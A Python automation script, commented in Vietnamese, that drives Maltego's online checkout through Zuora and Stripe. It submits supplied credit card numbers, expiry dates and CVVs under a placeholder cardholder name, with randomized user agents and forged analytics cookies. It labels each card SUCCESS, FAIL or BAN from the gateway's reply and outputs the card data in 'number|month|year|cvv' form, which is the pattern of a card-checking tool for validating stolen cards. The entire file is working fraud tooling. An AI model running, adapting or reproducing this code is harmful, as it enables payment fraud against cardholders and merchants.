from __future__ import annotations
import os, uuid, hashlib, random, time, base64, json

from flowlite import Flow, step, finalize, expect, http, js
from flowlite.plugins import CurlDump, MaskCookies


def md5_hex(s: str) -> str:
    return hashlib.md5(str(s).encode("utf-8")).hexdigest()


def delay(ms: int) -> None:
    # Tạm dừng theo mili-giây
    time.sleep(max(0, float(ms)) / 1000.0)


flow = Flow("matego").debug(trace=True)

# Bật plugin mask + dump cURL (tuỳ chọn)
LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "logs", "curl"))
flow.use(MaskCookies)
flow.use(CurlDump, dir=LOG_DIR, include_response=True, max_body=4096, split_by_flow=True)

UA_FALLBACKS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/133 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]

IPIFY = "https://api.ipify.org/?format=json"


@step("init_input")
def init_input(ctx):
    d = ctx.data or {}
    # Đầu vào từ request
    ctx.ccnum = str(d.get("CCNUM", "")).replace(" ", "")
    ctx.mm    = str(d.get("MM", ""))
    ctx.yyyy  = str(d.get("YYYY", ""))
    ctx.ccv   = str(d.get("CCV", ""))

    # Kiểm tra cơ bản
    expect.truthy(ctx.ccnum, "CCNUM required")
    expect.truthy(ctx.mm, "MM required")
    expect.truthy(ctx.yyyy, "YYYY required")
    expect.truthy(ctx.ccv, "CCV required")
    try:
        nmm = int(ctx.mm); expect.ge(nmm, 1); expect.ge(12, nmm)
    except Exception:
        raise AssertionError("MM invalid (1-12)")


@step("gen_random_md5")
def gen_random_md5(ctx):
    # Tạo giá trị ngẫu nhiên rồi md5 → random_id
    rand_src = str(uuid.uuid4())
    ctx.random_md5 = md5_hex(rand_src)
    # Gán vào accountid như yêu cầu
    ctx.accountid = ctx.random_md5


@step("get_random_ua")
def get_random_ua(ctx):
    # Lấy UA ngẫu nhiên từ danh sách fallback
    ctx.ua = random.choice(UA_FALLBACKS)


@step("check_ip_via_tls")
def check_ip_via_tls(ctx):
    # Gọi via TLS tới ipify với headers yêu cầu và timeout 60s
    r = (http.get(IPIFY)
           .accept("*/*")
           .header("accept-language", "en-US,en;q=0.8")
           .header("pragma", "no-cache")
           .user_agent(ctx.ua)
           .label("ipify")
           .via_tls()
           .timeout(60.0)
           .send())

    txt = r.text() or ""
    ok = (r.status == 200 and '{"ip":"' in txt)
    ctx.ok_ipify = bool(ok)
    if ok:
        ctx.ip = http.re(r'"ip"\s*:\s*"([^"]+)"', txt, 1)
    else:
        ctx.status = "BAN"
        raise AssertionError("BAN")


@step("get_unix_time")
def get_unix_time(ctx):
    # Lấy Unix time (mili-giây, 13 chữ số)
    ctx.currentUnixTimeOutput = int(time.time() * 1000)
    delay(1000)
    ctx.currentUnixTimeOutput2 = int(time.time())


@step("gen_uuid")
def gen_uuid(ctx):
    # Chạy script Node để sinh uuidv4 & uuidv5
    out = js.run("flows/js/uuidv5.js", {}, expect="text", timeout=10.0)
    txt = str(out or "")
    # Parse các dòng "uuidv4: ..." và "uuidv5: ..."
    v4 = http.re(r"uuidv4:\s*([0-9a-fA-F-]{36})", txt, 1)
    v5 = http.re(r"uuidv5:\s*([0-9a-fA-F-]{36})", txt, 1)
    ctx.uuidv4 = v4
    ctx.uuidv5 = v5


@step("set_hj_session_user")
def set_hj_session_user(ctx):
    # Tạo biến _hjSessionUser_4960794 theo yêu cầu
    ctx._hjSessionUser_4960794 = {
        "id": ctx.uuidv5,
        "created": ctx.currentUnixTimeOutput,
        "existing": True,
    }


@step("gen_random_suffix2")
def gen_random_suffix2(ctx):
    # Sinh 3 chữ số ngẫu nhiên [000-999] cho randomIntegerOutput2
    n = random.randint(0, 10)
    ctx.randomIntegerOutput2 = n
    ctx.randomIntegerOutput2_str = f"{n:03d}"


@step("set_hj_session")
def set_hj_session(ctx):
    # _hjSession_4960794: c = <currentUnixTimeOutput><randomIntegerOutput2>
    c_val = int(str(ctx.currentUnixTimeOutput))
    ctx._hjSession_4960794 = {
        "id": ctx.uuidv5,
        "c": c_val,
        "s": 1,
        "r": 1,
        "sb": 0,
        "sr": 0,
        "se": 0,
        "fs": 1,
        "sp": 0,
    }


@step("encode_hj_base64")
def encode_hj_base64(ctx):
    # Chuyển hai biến sang base64 JSON (UTF-8)
    u_json = json.dumps(ctx._hjSessionUser_4960794, ensure_ascii=False, separators=(",", ":"))
    s_json = json.dumps(ctx._hjSession_4960794, ensure_ascii=False, separators=(",", ":"))
    ctx._hjSessionUser_4960794_b64 = base64.b64encode(u_json.encode("utf-8")).decode("ascii")
    ctx._hjSession_4960794_b64 = base64.b64encode(s_json.encode("utf-8")).decode("ascii")


@step("store_auth")
def store_auth(ctx):
    url = "https://store.maltego.com/api/auth"
    cookie = (
        "%40webshop-order=[{%22productRatePlanId%22:%228a28a6a78edf7f02018ee25681bb44dd%22%2C%22priceId%22:%228a28a6a78edf7f02018ee25681e944df%22%2C%22price%22:6000%2C%22prices%22:{%22EUR%22:6000%2C%22USD%22:6600}%2C%22name%22:%22Maltego%20Professional%20(1%20Year)%22%2C%22quantity%22:1%2C%22year%22:1%2C%22quoteId%22:%22professional_1_year%22}]; "
        + "%40webshop-step=1; "
        + f"_hjSessionUser_4960794={ctx._hjSessionUser_4960794_b64}; "
        + f"_hjSession_4960794={ctx._hjSession_4960794_b64}"
    )

    # Body form rỗng → Content-Length = 0
    r = (http.post(url)
           .content_type("application/x-www-form-urlencoded")
           .header("sec-ch-ua-platform", '"Windows"')
           .header("accept-language", "en-US,en;q=0.9")
           .user_agent(ctx.ua)
           .header("sec-ch-ua-mobile", "?0")
           .accept("*/*")
           .header("origin", "https://store.maltego.com")
           .header("sec-fetch-site", "same-origin")
           .header("sec-fetch-mode", "cors")
           .header("sec-fetch-dest", "empty")
           .referer("https://store.maltego.com/checkout/address")
           .header("accept-encoding", "gzip, deflate, br")
           .header("priority", "u=1, i")
           .header("cookie", cookie)
           .label("store-auth")
           .via_tls()
           .form({})
           .timeout(60.0)
           .send())

    ctx.store_auth_status = r.status
    body_txt = r.text() or ""
    ctx.store_auth_body_head = body_txt[:1024]
    # Lưu headers để debug
    ctx.store_auth_headers = r.headers
    # Lấy token: ưu tiên header 'user-token', sau đó cookie hoặc từ 'Set-Cookie'
    token = r.header_one("user-token") or (r.cookies.get("user-token") if isinstance(r.cookies, dict) else None)
    if not token:
        for k, vals in (r.headers or {}).items():
            if str(k).lower() == "set-cookie":
                for sc in (vals or []):
                    first = (sc or "").split(";", 1)[0].strip()
                    if first.lower().startswith("user-token="):
                        token = first.split("=", 1)[1]
                        break
            if token:
                break
    ctx.usertoken = token
    ok = (r.status == 200 and '"success":true' in body_txt)
    if ok:
        ctx.status = "SUCCESS"
    else:
        ctx.status = "BAN"
        raise AssertionError("BAN")


@step("fetch_payment_js")
def fetch_payment_js(ctx):
    url = "https://store.maltego.com/_next/static/chunks/app/checkout/payment-method/page-d497311a1d581cc6.js"
    r = (http.get(url)
           .header("sec-ch-ua-platform", '"Windows"')
           .header("accept-language", "en-US,en;q=0.9")
           .user_agent(ctx.ua)
           .header("sec-ch-ua-mobile", "?0")
           .accept("*/*")
           .header("origin", "https://store.maltego.com")
           .header("sec-fetch-site", "same-origin")
           .header("sec-fetch-mode", "cors")
           .header("sec-fetch-dest", "empty")
           .referer("https://store.maltego.com/checkout/address")
           .header("accept-encoding", "gzip, deflate, br")
           .header("priority", "u=1, i")
           .label("payment-js")
           .via_tls()
           .timeout(60.0)
           .send())

    txt = r.text() or ""
    ctx.Maltegoid = http.re(r'Maltego Inc\."\s*:\s*"([^"\\]+)"', txt, 1)


@step("rsa_signatures")
def rsa_signatures(ctx):
    url = "https://store.maltego.com/api/checkout/rsa-signatures"
    payload = {
        "method": "POST",
        "pageId": ctx.Maltegoid,
        "uri": "https://eu.zuora.com/apps/PublicHostedPageLite.do",
    }

    body_raw = json.dumps(payload, ensure_ascii=False)
    r = (http.post(url)
           .content_type("text/plain;charset=UTF-8")
           .header("sec-ch-ua-platform", '"Windows"')
           .header("accept-language", "en-US,en;q=0.9")
           .user_agent(ctx.ua)
           .header("sec-ch-ua-mobile", "?0")
           .accept("*/*")
           .header("origin", "https://store.maltego.com")
           .header("sec-fetch-site", "same-origin")
           .header("sec-fetch-mode", "cors")
           .header("sec-fetch-dest", "empty")
           .referer("https://store.maltego.com/checkout/address")
           .header("accept-encoding", "gzip, deflate, br")
           .header("priority", "u=1, i")
           .label("rsa-signatures")
           .via_tls()
           .body_text(body_raw)
           .timeout(60.0)
           .send())

    body_txt = r.text() or ""
    # Trích xuất các trường cần thiết
    ctx.signature = http.re(r'"signature"\s*:\s*"([^\"]+)"', body_txt, 1)
    ctx.signatureen = http.urlencode(ctx.signature or "")
    ctx.token = http.re(r'"token"\s*:\s*"([^\"]+)"', body_txt, 1)
    ctx.key = http.re(r'"key"\s*:\s*"([^\"]+)"', body_txt, 1)
    ctx.tenantId = http.re(r'"tenantId"\s*:\s*"([^\"]+)"', body_txt, 1)

    ok = ('"success":true' in body_txt)
    if ok:
        ctx.status = "SUCCESS"
    else:
        ctx.status = "BAN"
        raise AssertionError("BAN")


@step("get_phpl_request_page")
def get_phpl_request_page(ctx):
    # Xây URL theo yêu cầu
    host_enc = http.urlencode("https://store.maltego.com/checkout/payment-method")
    url = (
        "https://eu.zuora.com/apps/PublicHostedPageLite.do"
        + f"?method=requestPage&host={host_enc}"
        + "&fromHostedPage=true&jsVersion=1.3.1"
        + f"&field_accountId={ctx.random_md5}"
        + f"&id={ctx.Maltegoid}"
        + f"&signature={ctx.signatureen}"
        + "&style=inline&submitEnabled=false"
        + f"&tenantId={ctx.tenantId}"
        + f"&token={ctx.token}"
        + "&billingEntity=Maltego%20Inc.&zlog_level=warn"
    )

    r = (http.get(url)
           .user_agent(ctx.ua)
           .header("pragma", "no-cache")
           .accept("*/*")
           .header("accept-language", "en-US,en;q=0.8")
           .label("phpl-requestPage")
           .via_tls()
           .timeout(60.0)
           .send())

    t = r.text() or ""
    ok = (r.status == 200 and 'id="signature" value="' in t)
    if not ok:
        ctx.status = "BAN"
        raise AssertionError("BAN")
    ctx.status = "SUCCESS"

    # Trích xuất các trường
    ctx.signatureh = http.re(r'id="signature"\s+value="([^"]+)"', t, 1)
    if ctx.signatureh:
        ctx.signaturehb64 = base64.b64encode((ctx.signatureh or "").encode("utf-8")).decode("ascii")
    ctx.field_key  = http.re(r'"field_key"\s+value="([^"]+)"', t, 1)
    if ctx.field_key:
        ctx.field_keyb64 = base64.b64encode((ctx.field_key or "").encode("utf-8")).decode("ascii")
    ctx.xjd28s_6sk = http.re(r'xjd28s_6sk"\s+value="([^"]+)"', t, 1)
    ctx.tokenpay   = http.re(r'id="token"\s+value="([^"]+)"', t, 1)
    ctx.id         = http.re(r'id="id"\s+value="([^"]+)"', t, 1)


@step("encrypt_hpm")
def encrypt_hpm(ctx):
    # Chạy JS để mã hoá theo HPM
    out = js.run("flows/js/hpm.js", {
        "CCNUM": ctx.ccnum,
        "MM": ctx.mm,
        "YYYY": ctx.yyyy,
        "CCV": ctx.ccv,
        "Ip": ctx.ip,
        "field_key": ctx.field_key,
    }, expect="auto", timeout=20.0)
    if isinstance(out, str):
        ctx.encrypt_result = {"encrypted_values": out}
        ctx.encrypted_values = out
    else:
        ctx.encrypt_result = out
        ctx.encrypted_values = (
            (out.get("encrypt_result") or {}).get("encrypted_values")
            or out.get("encrypted_values")
        )


@step("submit_phpl")
def submit_phpl(ctx):
    url = "https://eu.zuora.com/apps/PublicHostedPageLite.do"
    body = {
        "method": "submitPage",
        "id": ctx.Maltegoid,  # theo yêu cầu: dùng Maltegoid
        "tenantId": ctx.tenantId,
        "token": ctx.tokenpay,
        "signature": ctx.signatureh,
        "paymentGateway": "",
        "field_authorizationAmount": "",
        "field_screeningAmount": "",
        "field_currency": "",
        "field_key": ctx.field_key,
        "field_style": "inline",
        "jsVersion": "1.3.1",
        "field_submitEnabled": "false",
        "field_callbackFunctionEnabled": "",
        "field_signatureType": "",
        "host": "https://store.maltego.com/checkout/payment-method",
        "encrypted_fields": "#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear",
        "encrypted_values": ctx.encrypted_values,
        "customizeErrorRequired": "",
        "fromHostedPage": "true",
        "isGScriptLoaded": "false",
        "is3DSEnabled": "",
        "checkDuplicated": "",
        "captchaRequired": "",
        "captchaSiteKey": "",
        "field_mitConsentAgreementSrc": "",
        "field_mitConsentAgreementRef": "",
        "field_mitCredentialProfileType": "",
        "field_agreementSupportedBrands": "",
        "paymentGatewayType": "Stripe",
        "paymentGatewayVersion": "2",
        "is3DS2Enabled": "true",
        "cardMandateEnabled": "false",
        "zThreeDs2TxId": "",
        "threeDs2token": "",
        "threeDs2Sig": "",
        "threeDs2Ts": "",
        "threeDs2OnStep": "",
        "threeDs2GwData": "",
        "doPayment": "",
        "storePaymentMethod": "",
        "documents": "",
        "xjd28s_6sk": ctx.xjd28s_6sk or "",
        "pmId": "",
        "button_outside_force_redirect": "false",
        "browserScreenHeight": "1080",
        "browserScreenWidth": "1920",
        "field_passthrough1": "",
        "field_passthrough2": "",
        "field_passthrough3": "",
        "field_passthrough4": "",
        "field_passthrough5": "",
        "field_passthrough6": "",
        "field_passthrough7": "",
        "field_passthrough8": "",
        "field_passthrough9": "",
        "field_passthrough10": "",
        "field_passthrough11": "",
        "field_passthrough12": "",
        "field_passthrough13": "",
        "field_passthrough14": "",
        "field_passthrough15": "",
        "stripePublishableKey": "pk_live_51QIrjfK8sgAMMDRv46crceQ2VIDPsVhFvd859VQN8zASyRGUZ71ptxIYKYRIGbEfjsCjXtu2gfe9l3EtNe204bxV00dqSdFFRf",
        "isRSIEnabled": "false",
        "radarSessionId": "",
        "field_accountId": ctx.random_md5,
        "field_gatewayName": "",
        "field_deviceSessionId": "",
        "field_ipAddress": "",
        "field_useDefaultRetryRule": "",
        "field_paymentRetryWindow": "",
        "field_maxConsecutivePaymentFailures": "",
        "field_creditCardType": "Visa",
        "field_creditCardNumber": "",
        "field_creditCardExpirationMonth": "",
        "field_creditCardExpirationYear": "",
        "field_cardSecurityCode": "",
        "field_creditCardHolderName": "JOHN KALE",
        "field_creditCardPostalCode": "90003",
        "encodedZuoraIframeInfo": "eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vZXUuenVvcmEuY29tL2FwcHMvIiwiZm9ybVdpZHRoIjo4MDIsImZvcm1IZWlnaHQiOjMwMywibGF5b3V0U3R5bGUiOiJidXR0b25PdXRzaWRlIiwienVvcmFKc1ZlcnNpb24iOiIxLjMuMSIsImZvcm1GaWVsZHMiOlt7ImlkIjoiZm9ybS1lbGVtZW50LWNyZWRpdENhcmRUeXBlIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmROdW1iZXIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRFeHBpcmF0aW9uWWVhciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEhvbGRlck5hbWUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDb3VudHJ5IiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkU3RhdGUiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRBZGRyZXNzMSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MyIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQ2l0eSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZFBvc3RhbENvZGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LXBob25lIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1lbWFpbCIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfV19",
    }
    ctx.body = body
    r = (http.post(url)
           .content_type("application/x-www-form-urlencoded; charset=UTF-8")
           .header("sec-ch-ua-platform", '"Windows"')
           .header("accept-language", "en-US,en;q=0.9")
           .header("sec-ch-ua-mobile", "?0")
           .header("x-requested-with", "XMLHttpRequest")
           .user_agent(ctx.ua)
           .accept("application/json, text/javascript, */*; q=0.01")
           .header("origin", "https://eu.zuora.com")
           .header("sec-fetch-site", "same-origin")
           .header("sec-fetch-mode", "cors")
           .header("sec-fetch-dest", "empty")
           .header("sec-fetch-storage-access", "active")
           .header("accept-encoding", "gzip, deflate, br")
           .label("phpl-submit")
           .via_tls()
           .form(body)
           .timeout(60.0)
           .send())

    t = r.text() or ""
    ctx.raw = r.text()
    if ('AuthorizeResult":"Approved"' in t) or ("Your card's security code is incorrect" in t):
        ctx.status = "SUCCESS"
    elif ("ThreeDs2_Authentication_Exception" in t) or ("2Fcard_declined" in t) or ("transaction_not_allowed" in t) or ("Your card number is incorrect" in t):
        ctx.status = "FAIL"
    else:
        ctx.status = "BAN"


@finalize
def done(ctx):
    return {
        "status": ctx.status,
        "data": ctx.ccnum+"|"+ctx.mm+"|"+ctx.yyyy+"|"+ctx.ccv,
        "message": ctx.status,
    }


# Đăng ký step trong module
flow.register(globals())


if __name__ == "__main__":
    import json
    # Ví dụ dữ liệu test
    out = flow.run(data={}, session={}, options={})
    print(json.dumps(out, ensure_ascii=False, indent=2))


